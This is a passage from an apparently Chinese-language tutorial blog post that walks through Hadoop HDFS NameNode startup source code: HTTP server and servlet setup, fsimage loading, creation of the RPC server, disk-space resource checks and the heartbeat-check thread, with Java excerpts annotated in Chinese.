class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// Hadoop自己封装了HttpServer，形成自己的HttpServer2</span></span><br><span class="line">  HttpServer2.Builder builder = DFSUtil.httpServerTemplateForNNAndJN(conf,</span><br><span class="line">      httpAddr, httpsAddr, <span class="string">"hdfs"</span>,</span><br><span class="line">      DFSConfigKeys.DFS_NAMENODE_KERBEROS_INTERNAL_SPNEGO_PRINCIPAL_KEY,</span><br><span class="line">      DFSConfigKeys.DFS_NAMENODE_KEYTAB_FILE_KEY);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  httpServer = builder.build();</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  httpServer.setAttribute(NAMENODE_ATTRIBUTE_KEY, nn);</span><br><span class="line">  httpServer.setAttribute(JspHelper.CURRENT_CONF, conf);</span><br><span class="line">  setupServlets(httpServer, conf);</span><br><span class="line">  httpServer.start();</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击setupServlets，这里就是一些控制台的各个功能页跳转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setupServlets</span><span class="params">(HttpServer2 httpServer, Configuration conf)</span> </span>&#123;</span><br><span class="line">  httpServer.addInternalServlet(<span class="string">"startupProgress"</span>,</span><br><span class="line">    StartupProgressServlet.PATH_SPEC, StartupProgressServlet<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  httpServer.addInternalServlet(<span class="string">"fsck"</span>, <span class="string">"/fsck"</span>, FsckServlet<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">    <span class="title">true</span>)</span>;</span><br><span class="line">  httpServer.addInternalServlet(<span class="string">"imagetransfer"</span>, ImageServlet.PATH_SPEC,</span><br><span class="line">      ImageServlet<span class="class">.<span class="keyword">class</span>, <span class="title">true</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、加载镜像文件和编辑日志">3、加载镜像文件和编辑日志</h2><p>点击loadNamesystem</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">loadNamesystem</span><span class="params">(Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.namesystem = FSNamesystem.loadFromDisk(conf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> FSNamesystem <span class="title">loadFromDisk</span><span class="params">(Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  checkConfiguration(conf);</span><br><span class="line"></span><br><span class="line">  FSImage fsImage = <span class="keyword">new</span> FSImage(conf,</span><br><span class="line">      FSNamesystem.getNamespaceDirs(conf),</span><br><span class="line">      FSNamesystem.getNamespaceEditsDirs(conf));</span><br><span class="line"></span><br><span class="line">  FSNamesystem namesystem = <span class="keyword">new</span> FSNamesystem(conf, fsImage, <span class="keyword">false</span>);</span><br><span class="line">  StartupOption startOpt = NameNode.getStartupOption(conf);</span><br><span class="line">  <span class="keyword">if</span> (startOpt == StartupOption.RECOVER) &#123;</span><br><span class="line">    namesystem.setSafeMode(SafeModeAction.SAFEMODE_ENTER);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> loadStart = monotonicNow();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    namesystem.loadFSImage(startOpt);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">    LOG.warn(<span class="string">"Encountered exception loading fsimage"</span>, ioe);</span><br><span class="line">    fsImage.close();</span><br><span class="line">    <span class="keyword">throw</span> ioe;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">long</span> timeTakenToLoadFSImage = monotonicNow() - loadStart;</span><br><span class="line">  LOG.info(<span class="string">"Finished loading FSImage in "</span> + timeTakenToLoadFSImage + <span class="string">" msecs"</span>);</span><br><span class="line">  NameNodeMetrics nnMetrics = NameNode.getNameNodeMetrics();</span><br><span class="line">  <span class="keyword">if</span> (nnMetrics != <span class="keyword">null</span>) &#123;</span><br><span class="line">    nnMetrics.setFsImageLoadTime((<span class="keyword">int</span>) timeTakenToLoadFSImage);</span><br><span class="line">  &#125;</span><br><span class="line">  namesystem.getFSDirectory().createReservedStatuses(namesystem.getCTime());</span><br><span class="line">  <span class="keyword">return</span> namesystem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、初始化NN的RPC服务端">4、初始化NN的RPC服务端</h2><p>点击createRpcServer，如第一章的服务端RPC开启，为客户端提供服务支持，客户端可以通过rpc协议发送指令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> NameNodeRpcServer <span class="title">createRpcServer</span><span class="params">(Configuration conf)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> NameNodeRpcServer(conf, <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NameNodeRpcServer</span><span class="params">(Configuration conf, NameNode nn)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ....  </span><br><span class="line">    serviceRpcServer = <span class="keyword">new</span> RPC.Builder(conf)</span><br><span class="line">        .setProtocol(</span><br><span class="line">            org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolPB<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">        .<span class="title">setInstance</span>(<span class="title">clientNNPbService</span>)</span></span><br><span class="line"><span class="class">        .<span class="title">setBindAddress</span>(<span class="title">bindHost</span>)</span></span><br><span class="line"><span class="class">        .<span class="title">setPort</span>(<span class="title">serviceRpcAddr</span>.<span class="title">getPort</span>())</span></span><br><span class="line"><span class="class">        .<span class="title">setNumHandlers</span>(<span class="title">serviceHandlerCount</span>)</span></span><br><span class="line"><span class="class">        .<span class="title">setVerbose</span>(<span class="title">false</span>)</span></span><br><span class="line"><span class="class">        .<span class="title">setSecretManager</span>(<span class="title">namesystem</span>.<span class="title">getDelegationTokenSecretManager</span>())</span></span><br><span class="line"><span class="class">        .<span class="title">build</span>()</span>;</span><br><span class="line">  ... ....  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、NN启动资源检查">5、NN启动资源检查</h2><p>点击startCommonServices</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startCommonServices</span><span class="params">(Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  namesystem.startCommonServices(conf, haContext);</span><br><span class="line"></span><br><span class="line">  registerNNSMXBean();</span><br><span class="line">  <span class="keyword">if</span> (NamenodeRole.NAMENODE != role) &#123;</span><br><span class="line">    startHttpServer(conf);</span><br><span class="line">    httpServer.setNameNodeAddress(getNameNodeAddress());</span><br><span class="line">    httpServer.setFSImage(getFSImage());</span><br><span class="line">  &#125;</span><br><span class="line">  rpcServer.start();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    plugins = conf.getInstances(DFS_NAMENODE_PLUGINS_KEY,</span><br><span class="line">        ServicePlugin<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">    String pluginsValue = conf.get(DFS_NAMENODE_PLUGINS_KEY);</span><br><span class="line">    LOG.error(<span class="string">"Unable to load NameNode plugins. Specified list of plugins: "</span> +</span><br><span class="line">        pluginsValue, e);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击startCommonServices</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">startCommonServices</span><span class="params">(Configuration conf, HAContext haContext)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.registerMBean(); <span class="comment">// register the MBean for the FSNamesystemState</span></span><br><span class="line">  writeLock();</span><br><span class="line">  <span class="keyword">this</span>.haContext = haContext;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    nnResourceChecker = <span class="keyword">new</span> NameNodeResourceChecker(conf);</span><br><span class="line">    <span class="comment">// 检查是否有足够的磁盘存储元数据（fsimage（默认100m） editLog（默认100m））</span></span><br><span class="line">    checkAvailableResources();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> !blockManager.isPopulatingReplQueues();</span><br><span class="line">    StartupProgress prog = NameNode.getStartupProgress();</span><br><span class="line">    prog.beginPhase(Phase.SAFEMODE);</span><br><span class="line"><span class="keyword">long</span> completeBlocksTotal = getCompleteBlocksTotal();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全模式</span></span><br><span class="line">    prog.setTotal(Phase.SAFEMODE, STEP_AWAITING_REPORTED_BLOCKS,</span><br><span class="line">        completeBlocksTotal);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动块服务</span></span><br><span class="line">    blockManager.activate(conf, completeBlocksTotal);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    writeUnlock(<span class="string">"startCommonServices"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  registerMXBean();</span><br><span class="line">  DefaultMetricsSystem.instance().register(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">if</span> (inodeAttributeProvider != <span class="keyword">null</span>) &#123;</span><br><span class="line">    inodeAttributeProvider.start();</span><br><span class="line">    dir.setINodeAttributeProvider(inodeAttributeProvider);</span><br><span class="line">  &#125;</span><br><span class="line">  snapshotManager.registerMXBean();</span><br><span class="line">  InetSocketAddress serviceAddress = NameNode.getServiceAddress(conf, <span class="keyword">true</span>);</span><br><span class="line">  <span class="keyword">this</span>.nameNodeHostName = (serviceAddress != <span class="keyword">null</span>) ?</span><br><span class="line">      serviceAddress.getHostName() : <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击NameNodeResourceChecker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NameNodeResourceChecker</span><span class="params">(Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.conf = conf;</span><br><span class="line">  volumes = <span class="keyword">new</span> HashMap&lt;String, CheckedVolume&gt;();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// dfs.namenode.resource.du.reserved默认值 1024 * 1024 * 100 =》100m</span></span><br><span class="line">  duReserved = conf.getLong(DFSConfigKeys.DFS_NAMENODE_DU_RESERVED_KEY,</span><br><span class="line">      DFSConfigKeys.DFS_NAMENODE_DU_RESERVED_DEFAULT);</span><br><span class="line">  </span><br><span class="line">  Collection&lt;URI&gt; extraCheckedVolumes = Util.stringCollectionAsURIs(conf</span><br><span class="line">      .getTrimmedStringCollection(DFSConfigKeys.DFS_NAMENODE_CHECKED_VOLUMES_KEY));</span><br><span class="line">  </span><br><span class="line">  Collection&lt;URI&gt; localEditDirs = Collections2.filter(</span><br><span class="line">      FSNamesystem.getNamespaceEditsDirs(conf),</span><br><span class="line">      <span class="keyword">new</span> Predicate&lt;URI&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">apply</span><span class="params">(URI input)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (input.getScheme().equals(NNStorage.LOCAL_URI_SCHEME)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对所有路径进行资源检查</span></span><br><span class="line">  <span class="keyword">for</span> (URI editsDirToCheck : localEditDirs) &#123;</span><br><span class="line">    addDirToCheck(editsDirToCheck,</span><br><span class="line">        FSNamesystem.getRequiredNamespaceEditsDirs(conf).contains(</span><br><span class="line">            editsDirToCheck));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// All extra checked volumes are marked "required"</span></span><br><span class="line">  <span class="keyword">for</span> (URI extraDirToCheck : extraCheckedVolumes) &#123;</span><br><span class="line">    addDirToCheck(extraDirToCheck, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  minimumRedundantVolumes = conf.getInt(</span><br><span class="line">      DFSConfigKeys.DFS_NAMENODE_CHECKED_VOLUMES_MINIMUM_KEY,</span><br><span class="line">      DFSConfigKeys.DFS_NAMENODE_CHECKED_VOLUMES_MINIMUM_DEFAULT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击checkAvailableResources</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkAvailableResources</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> resourceCheckTime = monotonicNow();</span><br><span class="line">  Preconditions.checkState(nnResourceChecker != <span class="keyword">null</span>,</span><br><span class="line">    <span class="string">"nnResourceChecker not initialized"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断资源是否足够，不够返回false</span></span><br><span class="line">  hasResourcesAvailable = nnResourceChecker.hasAvailableDiskSpace();</span><br><span class="line"></span><br><span class="line">  resourceCheckTime = monotonicNow() - resourceCheckTime;</span><br><span class="line">  NameNode.getNameNodeMetrics().addResourceCheckTime(resourceCheckTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasAvailableDiskSpace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> NameNodeResourcePolicy.areResourcesAvailable(volumes.values(),</span><br><span class="line">      minimumRedundantVolumes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">areResourcesAvailable</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Collection&lt;? extends CheckableNameNodeResource&gt; resources,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> minimumRedundantResources)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> workaround:</span></span><br><span class="line">  <span class="comment">// - during startup, if there are no edits dirs on disk, then there is</span></span><br><span class="line">  <span class="comment">// a call to areResourcesAvailable() with no dirs at all, which was</span></span><br><span class="line">  <span class="comment">// previously causing the NN to enter safemode</span></span><br><span class="line">  <span class="keyword">if</span> (resources.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> requiredResourceCount = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> redundantResourceCount = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> disabledRedundantResourceCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断资源是否充足</span></span><br><span class="line">  <span class="keyword">for</span> (CheckableNameNodeResource resource : resources) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!resource.isRequired()) &#123;</span><br><span class="line">      redundantResourceCount++;</span><br><span class="line">      <span class="keyword">if</span> (!resource.isResourceAvailable()) &#123;</span><br><span class="line">        disabledRedundantResourceCount++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      requiredResourceCount++;</span><br><span class="line">      <span class="keyword">if</span> (!resource.isResourceAvailable()) &#123;</span><br><span class="line">        <span class="comment">// Short circuit - a required resource is not available. 不充足返回false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (redundantResourceCount == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// If there are no redundant resources, return true if there are any</span></span><br><span class="line">    <span class="comment">// required resources available.</span></span><br><span class="line">    <span class="keyword">return</span> requiredResourceCount &gt; <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> redundantResourceCount - disabledRedundantResourceCount &gt;=</span><br><span class="line">        minimumRedundantResources;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">CheckableNameNodeResource</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isResourceAvailable</span><span class="params">()</span></span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRequired</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if (!resource.isResourceAvailable())，ctrl+alt+B可以查看其实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isResourceAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取当前目录的空间大小</span></span><br><span class="line">  <span class="keyword">long</span> availableSpace = df.getAvailable();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">    LOG.debug(<span class="string">"Space available on volume '"</span> + volume + <span class="string">"' is "</span></span><br><span class="line">        + availableSpace);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前空间大小，小于100m，返回false</span></span><br><span class="line">  <span class="keyword">if</span> (availableSpace &lt; duReserved) &#123;</span><br><span class="line">    LOG.warn(<span class="string">"Space available on volume '"</span> + volume + <span class="string">"' is "</span></span><br><span class="line">        + availableSpace +</span><br><span class="line">        <span class="string">", which is below the configured reserved amount "</span> + duReserved);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6、NN对心跳超时判断">6、NN对心跳超时判断</h2><p>Ctrl + n 搜索namenode，ctrl + f搜索<code>startCommonServices</code>，点击<code>namesystem.startCommonServices(conf, haContext);</code>点击<code>blockManager.activate(conf, completeBlocksTotal);</code>点击<code>datanodeManager.activate(conf);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">activate</span><span class="params">(<span class="keyword">final</span> Configuration conf)</span> </span>&#123;</span><br><span class="line">  datanodeAdminManager.activate(conf);</span><br><span class="line">  heartbeatManager.activate();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 启动的线程，搜索run方法</span></span><br><span class="line">  heartbeatThread.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(namesystem.isRunning()) &#123;</span><br><span class="line">    restartHeartbeatStopWatch();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> now = Time.monotonicNow();</span><br><span class="line">      <span class="keyword">if</span> (lastHeartbeatCheck + heartbeatRecheckInterval &lt; now) &#123;</span><br><span class="line">    <span class="comment">// 心跳检查</span></span><br><span class="line">        heartbeatCheck();</span><br><span class="line">        lastHeartbeatCheck = now;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (blockManager.shouldUpdateBlockKey(now - lastBlockKeyUpdate)) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(HeartbeatManager.<span class="keyword">this</span>) &#123;</span><br><span class="line">          <span class="keyword">for</span>(DatanodeDescriptor d : datanodes) &#123;</span><br><span class="line">            d.setNeedKeyUpdate(<span class="keyword">true</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        lastBlockKeyUpdate = now;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) 